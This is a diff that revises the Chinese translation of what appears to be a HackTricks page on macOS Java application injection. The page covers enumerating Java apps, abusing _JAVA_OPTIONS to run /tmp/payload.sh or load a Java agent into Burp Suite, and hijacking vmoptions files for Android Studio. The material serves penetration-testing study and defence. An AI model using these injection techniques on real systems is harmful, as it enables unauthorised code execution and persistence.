@@ -4,7 +4,7 @@
 
 ## 枚举
 
-查找安装在系统中的 Java 应用程序。注意到 **Info.plist** 中的 Java 应用程序将包含一些包含字符串 **`java.`** 的 Java 参数，因此您可以搜索该字符串：
+查找系统中已安装的 Java 应用程序。经发现，**Info.plist** 中的 Java 应用程序会包含一些含有字符串 **`java.`** 的 Java 参数，因此可以搜索该字符串：
 ```bash
 # Search only in /Applications folder
 sudo find /Applications -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
@@ -14,13 +14,13 @@ sudo find / -name 'Info.plist' -exec grep -l "java\." {} \; 2>/dev/null
 ```
 ## \_JAVA_OPTIONS
 
-环境变量 **`_JAVA_OPTIONS`** 可用于在执行编译的 Java 应用程序时注入任意 Java 参数：
+环境变量 **`_JAVA_OPTIONS`** 可用于在执行已编译的 Java 应用时注入任意 Java 参数：
 ```bash
 # Write your payload in a script called /tmp/payload.sh
 export _JAVA_OPTIONS='-Xms2m -Xmx5m -XX:OnOutOfMemoryError="/tmp/payload.sh"'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
 ```
-要将其作为新进程而不是当前终端的子进程执行，可以使用：
+要将其作为新进程执行，而不是作为当前终端的子进程执行，可以使用：
 ```objectivec
 #import <Foundation/Foundation.h>
 // clang -fobjc-arc -framework Foundation invoker.m -o invoker
@@ -73,7 +73,7 @@ NSMutableDictionary *environment = [NSMutableDictionary dictionaryWithDictionary
 return 0;
 }
 ```
-然而，这会在执行的应用程序上触发错误，另一种更隐蔽的方法是创建一个 Java 代理并使用：
+不过，这会在被执行的 app 上触发错误；另一种更隐蔽的方法是创建一个 Java agent 并使用：
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -83,9 +83,9 @@ export _JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
 > [!CAUTION]
-> 使用与应用程序**不同的 Java 版本**创建代理可能会导致代理和应用程序的执行崩溃
+> 使用与应用程序**不同的 Java 版本**创建 agent，可能会导致 agent 和应用程序的执行崩溃
 
-代理可以是：
+agent 可以是：
 ```java:Agent.java
 import java.io.*;
 import java.lang.instrument.*;
@@ -102,7 +102,7 @@ err.printStackTrace();
 }
 }
 ```
-要编译代理，请运行：
+编译 agent 的命令：
 ```bash
 javac Agent.java # Create Agent.class
 jar cvfm Agent.jar manifest.txt Agent.class # Create Agent.jar
@@ -114,7 +114,7 @@ Agent-Class: Agent
 Can-Redefine-Classes: true
 Can-Retransform-Classes: true
 ```
-然后导出环境变量并运行 Java 应用程序，如下所示：
+然后导出 env 变量，并运行 Java 应用程序，如下：
 ```bash
 export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 "/Applications/Burp Suite Professional.app/Contents/MacOS/JavaApplicationStub"
@@ -123,14 +123,14 @@ export _JAVA_OPTIONS='-javaagent:/tmp/j/Agent.jar'
 
 open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Professional"
 ```
-## vmoptions 文件
+## vmoptions file
 
-此文件支持在执行 Java 时指定 **Java 参数**。您可以使用之前的一些技巧来更改 Java 参数并 **使进程执行任意命令**。\
-此外，此文件还可以通过 `include` 目录 **包含其他文件**，因此您也可以更改包含的文件。
+该文件支持在执行 Java 时指定 **Java params**。你可以使用之前的一些技巧来修改 Java params，并 **使该进程执行任意命令**。\
+此外，该文件还可以通过 `include` directory **包含其他文件**，因此你也可以修改被包含的文件。
 
-更重要的是，一些 Java 应用程序将 **加载多个 `vmoptions`** 文件。
+更进一步，某些 Java 应用会 **加载多个 `vmoptions`** 文件。
 
-一些应用程序，如 Android Studio，会在其 **输出中指示它们正在查找** 这些文件的位置，例如：
+一些应用（如 Android Studio）会在其 **output 中指出它们正在查找这些文件的位置**，例如：
 ```bash
 /Applications/Android\ Studio.app/Contents/MacOS/studio 2>&1 | grep vmoptions
 
@@ -141,7 +141,7 @@ open --env "_JAVA_OPTIONS='-javaagent:/tmp/Agent.jar'" -a "Burp Suite Profession
 2023-12-13 19:53:23.922 studio[74913:581359] parseVMOptions: /Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 2023-12-13 19:53:23.923 studio[74913:581359] parseVMOptions: platform=20 user=1 file=/Users/carlospolop/Library/Application Support/Google/AndroidStudio2022.3/studio.vmoptions
 ```
-如果他们没有，你可以轻松检查：
+如果它们没有，你可以轻松使用以下方法进行检查：
 ```bash
 # Monitor
 sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
@@ -149,6 +149,6 @@ sudo eslogger lookup | grep vmoption # Give FDA to the Terminal
 # Launch the Java app
 /Applications/Android\ Studio.app/Contents/MacOS/studio
 ```
-注意到在这个例子中，Android Studio 正在尝试加载文件 **`/Applications/Android Studio.app.vmoptions`**，这是任何来自 **`admin` 组的用户都有写入权限的地方。** 
+注意，在这个示例中，Android Studio 试图加载文件 **`/Applications/Android Studio.app.vmoptions`**。该位置允许 **`admin` 组中的任何用户写入。**
 
 {{#include ../../../banners/hacktricks-training.md}}
